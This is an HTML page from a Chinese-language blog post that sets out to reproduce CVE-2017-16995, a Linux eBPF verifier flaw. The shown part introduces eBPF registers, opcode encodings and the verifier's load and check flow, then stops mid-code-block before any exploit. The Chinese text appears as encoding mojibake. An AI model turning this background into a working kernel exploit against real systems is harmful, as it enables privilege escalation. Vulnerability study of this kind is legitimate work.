<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            CVE-2017-16995å¤ç° |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/ufo.ico">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-folder","tags":"/tags || fa-solid fa-tags"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"è¯„è®ºé‚®ä»¶é€šçŸ¥çš„åŠŸèƒ½å·²å¼€å¯ï¼Œæ¬¢è¿å¤§å®¶ç•™è¨€è¯„è®ºï¼Œæœ‰é—®é¢˜æˆ‘ä¼šåŠæ—¶å›å¤çš„å“¦ï½","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"æ…¢æ…¢å¥½èµ·æ¥"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®ºï¼ˆç•™ä¸‹é‚®ç®±æœ‰é€šçŸ¥å“¦ï½ï¼‰"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/ling.JPG">
                </a>
            
            <a class="site-name border-box" href="/">
               196082&#39;s blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                é¦–é¡µ
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                å½’æ¡£
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-folder"></i>
                                
                                åˆ†ç±»
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                æ ‡ç­¾
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            é¦–é¡µ
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            å½’æ¡£
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-folder"></i>
                                </span>
                            
                            åˆ†ç±»
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            æ ‡ç­¾
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        CVE-2017-16995å¤ç°
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/ling.JPG">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">196082</span>
                                
                                    <span class="author-badge">æ…¢æ…¢å¥½èµ·æ¥</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2022-10-10 17:07:38</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Wed Nov 29 2023 18:11:10 GMT+0800">2023-11-29 18:11:10</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/Linux-Kernel/">Linux Kernel</a></li>
                        
                    
                            <li class="category-item">&nbsp;<i class="icon fas fa-angle-right"></i>&nbsp;<a href="/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/">CVEå¤ç°</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ebpf/">ebpf</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>6.1k å­—</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>32 åˆ†é’Ÿ</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p>è¿™ä¸€ç¯‡æ˜¯ä½œä¸ºebpfçš„å…¥é—¨æ–‡ç« ï¼Œæ‰€ä»¥ä¼šç¨å¾®ä»‹ç»ä¸€ä¸‹æŒ‡ä»¤é›†ï¼Œå¯„å­˜å™¨ã€‚å¯èƒ½ç¯‡å¹…ç•¥é•¿ã€‚</p>
<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>è¯¥æ¼æ´æœ€æ—©æ˜¯ç”±17å¹´12æœˆ21å·Google Project Zeroå›¢é˜Ÿçš„Jann Hornå‘ç°å¹¶æŠ¥å‘Šçš„ï¼Œç¼–å·ä¸ºCVE-2017-16995ã€‚<br><strong>å†…æ ¸å½±å“ç‰ˆæœ¬ï¼š</strong>Linux Kernel Version 4.14 ~ 4.4 ã€‚</p>
<h2 id="eBPFæŒ‡ä»¤é›†ä»‹ç»"><a href="#eBPFæŒ‡ä»¤é›†ä»‹ç»" class="headerlink" title="eBPFæŒ‡ä»¤é›†ä»‹ç»"></a>eBPFæŒ‡ä»¤é›†ä»‹ç»</h2><p>åœ¨è®¤è¯†ä¸€ä¸ªæ–°çš„æŒ‡ä»¤é›†çš„ç¬¬ä¸€æ­¥å°±æ˜¯è®¤è¯†å¯„å­˜å™¨ï¼Œåœ¨eBPFä¸­å­˜åœ¨åä¸€ä¸ªå¯„å­˜å™¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R0ï¼šä¸€èˆ¬ç”¨æ¥è¡¨ç¤ºå‡½æ•°è¿”å›å€¼ï¼ŒåŒ…æ‹¬æ•´ä¸ª BPF ä»£ç å—ï¼ˆå…¶å®ä¹Ÿå¯è¢«çœ‹åšä¸€ä¸ªå‡½æ•°ï¼‰çš„è¿”å›å€¼ï¼›</span><br><span class="line">R1~R5ï¼šä¸€èˆ¬ç”¨äºè¡¨ç¤ºå†…æ ¸é¢„è®¾å‡½æ•°çš„å‚æ•°ï¼›</span><br><span class="line">R6~R9ï¼šåœ¨ BPF ä»£ç ä¸­å¯ä»¥ä½œå­˜å‚¨ç”¨ï¼Œå…¶å€¼ä¸å—å†…æ ¸é¢„è®¾å‡½æ•°å½±å“ï¼›</span><br><span class="line">R10ï¼šåªè¯»ï¼Œç”¨ä½œæ ˆæŒ‡é’ˆ(SP)</span><br><span class="line">å¯ç†è§£å¯¹åº”ä¸ºç‰©ç†å¯„å­˜å™¨ä¸ºï¼š</span><br><span class="line">		R0 â€“ rax</span><br><span class="line">    R1 - rdi</span><br><span class="line">    R2 - rsi</span><br><span class="line">    R3 - rdx</span><br><span class="line">    R4 - rcx</span><br><span class="line">    R5 - r8</span><br><span class="line">    R6 - rbx</span><br><span class="line">    R7 - r13</span><br><span class="line">    R8 - r14</span><br><span class="line">    R9 - r15</span><br><span class="line">    R10 â€“ rbp</span><br></pre></td></tr></table></figure>

<p>å¯¹äºç®—æ•°(ALU)å’Œè·³è½¬(JMP)æŒ‡ä»¤ï¼Œ8bitçš„ä»£ç å­—æ®µåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+--------+--------------------+</span><br><span class="line">|   4 bits       |  1 bit |   3 bits           |</span><br><span class="line">| operation code | source | instruction class  |</span><br><span class="line">+----------------+--------+--------------------+</span><br><span class="line">(MSB)                                      (LSB)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ€å3bit LSBä»£è¡¨æŒ‡ä»¤ç±»å‹ï¼š	</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eBPF classes:</span><br><span class="line"></span><br><span class="line"> BPF_LD    <span class="number">0x00</span></span><br><span class="line"> BPF_LDX   <span class="number">0x01</span></span><br><span class="line"> BPF_ST    <span class="number">0x02</span></span><br><span class="line"> BPF_STX   <span class="number">0x03</span></span><br><span class="line"> BPF_ALU   <span class="number">0x04</span></span><br><span class="line"> BPF_JMP   <span class="number">0x05</span></span><br><span class="line"> BPF_JMP32 <span class="number">0x06</span></span><br><span class="line"> BPF_ALU64 <span class="number">0x07</span></span><br></pre></td></tr></table></figure>

<p>å½“<code>BPF_CLASS(code) == BPF_ALU or BPF_JMP</code>æ—¶,ç¬¬å››bitç¼–ç æºæ“ä½œæ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BPF_K     <span class="number">0x00</span> ï¼›ä»£è¡¨å°†ç«‹å³æ•°ä½œä¸ºæºæ“ä½œæ•°</span><br><span class="line">BPF_X     <span class="number">0x08</span> ï¼›ä»£è¡¨å°†â€˜src_regâ€™ä½œä¸ºæºæ“ä½œæ•°</span><br></pre></td></tr></table></figure>

<p>å‰4bitçš„MSBç”¨æ¥å­˜å‚¨æ“ä½œç ï¼š</p>
<ol>
<li>å¦‚æœ BPF_CLASS(code) &#x3D;&#x3D; BPF_ALU or BPF_ALU64æ—¶ï¼Œæ“ä½œç ä¼šæ˜¯ä¸‹é¢çš„ä¸€ä¸ªï¼š</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_ADD   <span class="number">0x00</span></span><br><span class="line">BPF_SUB   <span class="number">0x10</span></span><br><span class="line">BPF_MUL   <span class="number">0x20</span></span><br><span class="line">BPF_DIV   <span class="number">0x30</span></span><br><span class="line">BPF_OR    <span class="number">0x40</span></span><br><span class="line">BPF_AND   <span class="number">0x50</span></span><br><span class="line">BPF_LSH   <span class="number">0x60</span></span><br><span class="line">BPF_RSH   <span class="number">0x70</span></span><br><span class="line">BPF_NEG   <span class="number">0x80</span></span><br><span class="line">BPF_MOD   <span class="number">0x90</span></span><br><span class="line">BPF_XOR   <span class="number">0xa0</span></span><br><span class="line">BPF_MOV   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: mov reg to reg */</span></span><br><span class="line">BPF_ARSH  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: sign extending shift right */</span></span><br><span class="line">BPF_END   <span class="number">0xd0</span>  <span class="comment">/* eBPF only: endianness conversion */</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>å¦‚æœBPF_CLASS(code) &#x3D;&#x3D; BPF_JMP or BPF_JMP32æ—¶ï¼Œæ“ä½œç å°†ä¼šæ˜¯ä¸‹é¢çš„ä¸€ä¸ªï¼š</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_JA    <span class="number">0x00</span>  <span class="comment">/* BPF_JMP only */</span></span><br><span class="line">BPF_JEQ   <span class="number">0x10</span></span><br><span class="line">BPF_JGT   <span class="number">0x20</span></span><br><span class="line">BPF_JGE   <span class="number">0x30</span></span><br><span class="line">BPF_JSET  <span class="number">0x40</span></span><br><span class="line">BPF_JNE   <span class="number">0x50</span>  <span class="comment">/* eBPF only: jump != */</span></span><br><span class="line">BPF_JSGT  <span class="number">0x60</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span></span><br><span class="line">BPF_JSGE  <span class="number">0x70</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span></span><br><span class="line">BPF_CALL  <span class="number">0x80</span>  <span class="comment">/* eBPF BPF_JMP only: function call */</span></span><br><span class="line">BPF_EXIT  <span class="number">0x90</span>  <span class="comment">/* eBPF BPF_JMP only: function return */</span></span><br><span class="line">BPF_JLT   <span class="number">0xa0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JLE   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;=&#x27; */</span></span><br><span class="line">BPF_JSLT  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JSLE  <span class="number">0xd0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;=&#x27; */</span></span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚ <code>BPF_ADD | BPF_X | BPF_ALU</code>è¿™æ¡æŒ‡ä»¤ä»£è¡¨32ä½åŠ æ³•è¿ç®—ï¼Œå°†æºå¯„å­˜å™¨çš„å€¼åŠ ä¸Šç›®çš„å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åå°†ç»“æœå­˜å‚¨åˆ°ç›®çš„å¯„å­˜å™¨ä¸­ï¼š<code>dst_reg = (u32) dst_reg + (u32) src_reg;</code></p>
<p>å¹¶ä¸”ï¼Œåœ¨eBPFæŒ‡ä»¤é›†ä¸­æ²¡æœ‰äº†BPF_RETæŒ‡ä»¤ï¼Œç”¨<code>BPF_JMP | BPF_EXIT</code>ä»…ä»£æ›¿å‡½æ•°æ‰§è¡Œå®Œé€€å‡ºï¼Œåœ¨å‡½æ•°é€€å‡ºä¹‹å‰ï¼ŒeBPFéœ€è¦å°†è¿”å›å€¼å­˜å‚¨åœ¨R0ä¸­ã€‚</p>
<p>å¯¹äºåŠ è½½ï¼ˆLOADï¼‰å’Œå­˜å‚¨(STORE)æŒ‡ä»¤ï¼Œ8-bitçš„ä»£ç åŸŸåˆ†ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+-------------------+</span><br><span class="line">| <span class="number">3</span> bits | <span class="number">2</span> bits |   <span class="number">3</span> bits          |</span><br><span class="line">|  mode  |  size  | instruction <span class="class"><span class="keyword">class</span> |</span></span><br><span class="line"><span class="class">+--------+--------+-------------------+</span></span><br><span class="line"><span class="class">(<span class="title">MSB</span>)                             (<span class="title">LSB</span>)</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­sizeåˆ†åˆ«æœ‰ä¸‹é¢å››ç§ç±»å‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_W   <span class="number">0x00</span>   ; word <span class="number">4</span> byte</span><br><span class="line">BPF_H   <span class="number">0x08</span>   ; half word <span class="number">2</span> byte</span><br><span class="line">BPF_B   <span class="number">0x10</span>   ; byte </span><br><span class="line">BPF_DW  <span class="number">0x18</span>   ; <span class="keyword">double</span> word <span class="number">8</span> byte</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”åœ¨å†…æ ¸ä¸­ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤çš„ä¿¡æ¯éƒ½å‚¨å­˜åœ¨bpf_insnç»“æ„ä½“ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="eBPFä»£ç åŠ è½½æ‰§è¡Œæµç¨‹-æ£€æŸ¥åˆ†æ"><a href="#eBPFä»£ç åŠ è½½æ‰§è¡Œæµç¨‹-æ£€æŸ¥åˆ†æ" class="headerlink" title="eBPFä»£ç åŠ è½½æ‰§è¡Œæµç¨‹ &amp; æ£€æŸ¥åˆ†æ"></a>eBPFä»£ç åŠ è½½æ‰§è¡Œæµç¨‹ &amp; æ£€æŸ¥åˆ†æ</h2><h3 id="åŠ è½½æ‰§è¡Œæµç¨‹"><a href="#åŠ è½½æ‰§è¡Œæµç¨‹" class="headerlink" title="åŠ è½½æ‰§è¡Œæµç¨‹"></a>åŠ è½½æ‰§è¡Œæµç¨‹</h3><p>ç”¨æˆ·å¯ä»¥ç”¨eBPFæŒ‡ä»¤å­—èŠ‚ç çš„å½¢å¼å‘å†…æ ¸è¾“é€ä»£ç ï¼Œå¹¶é€šè¿‡äº‹ä»¶æ¥ï¼ˆå¦‚å¾€socketå†™æ•°æ®ï¼‰æ¥è§¦å‘å†…æ ¸æ‰§è¡Œç”¨æˆ·æä¾›çš„eBPFä»£ç ã€‚eBPFæ¨¡å—å¯ä»¥è®©ç”¨æˆ·åŠ è½½æ•°æ®åŒ…è¿‡æ»¤ä»£ç ï¼ˆeBPFä»£ç ï¼‰è¿›å…¥å†…æ ¸ï¼Œåœ¨æ”¶åˆ°æ•°æ®åŒ…æ—¶è§¦å‘eBPFä»£ç æ‰§è¡Œã€‚å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æ•°æ®åŒ…è¿‡æ»¤ç¨‹åºæ¥è§¦å‘æ‰§è¡ŒeBPFä»£ç ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)) ï¼›åˆ›å»ºå…¨å±€å˜é‡<span class="built_in">map</span>ç»“æ„ä½“ï¼Œå†…æ ¸æ€ç”¨æˆ·æ€éƒ½å¯ä»¥è®¿é—®ã€‚</span><br><span class="line">* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr)) ï¼›å°†ç”¨æˆ·æ€çš„BPFä»£ç æ³¨å…¥åˆ°å†…æ ¸ï¼Œå¹¶å¯¹ä»£ç è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶æ¨¡æ‹Ÿæ‰§è¡Œã€‚</span><br><span class="line">    * <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span> ï¼›åˆ¤æ–­è¿‡æ»¤æ¨¡å¼</span></span><br><span class="line"><span class="function">        * <span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function">            * <span class="title">check_cfg</span><span class="params">(env)</span></span>; ç¬¬ä¸€è½®æ£€æŸ¥ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¯è·¯</span><br><span class="line">            * do_check(env);  ç¬¬äºŒè½®æ£€æŸ¥ï¼Œè¯¦ç»†æ‰«æBPFä»£ç çš„è¿è¡Œè¿‡ç¨‹ï¼Œè·Ÿè¸ªåˆ†æå¯„å­˜å™¨å’Œå †æ ˆï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ä¸ç¬¦åˆè§„åˆ™çš„æƒ…å†µå‡ºç°</span><br><span class="line">    * <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)ï¼›è¿è¡ŒBPFæŒ‡ä»¤ï¼Œæœ€åçœŸæ­£è¿è¡Œçš„çš„å‡½æ•°ã€‚</span><br><span class="line">* setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd))ï¼›å°†eBPFä¸ç‰¹å®šçš„äº‹ä»¶ç»‘å®šï¼Œåœ¨æ”¶åˆ°æ•°æ®åŒ…æ—¶è§¦å‘eBPFä»£ç æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure>

<h3 id="æ£€æŸ¥åˆ†æ"><a href="#æ£€æŸ¥åˆ†æ" class="headerlink" title="æ£€æŸ¥åˆ†æ"></a>æ£€æŸ¥åˆ†æ</h3><p>æ ¹æ®ä¸Šè¿°æµç¨‹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å°†BPFä»£ç æ³¨å…¥åˆ°å†…æ ¸ä¸­æ˜¯å‘ç”Ÿåœ¨ç¬¬äºŒæ­¥ä¸­çš„ï¼Œæ‰§è¡Œçš„å‡½æ•°ä¸ºï¼š<code>bpf_prog_load</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 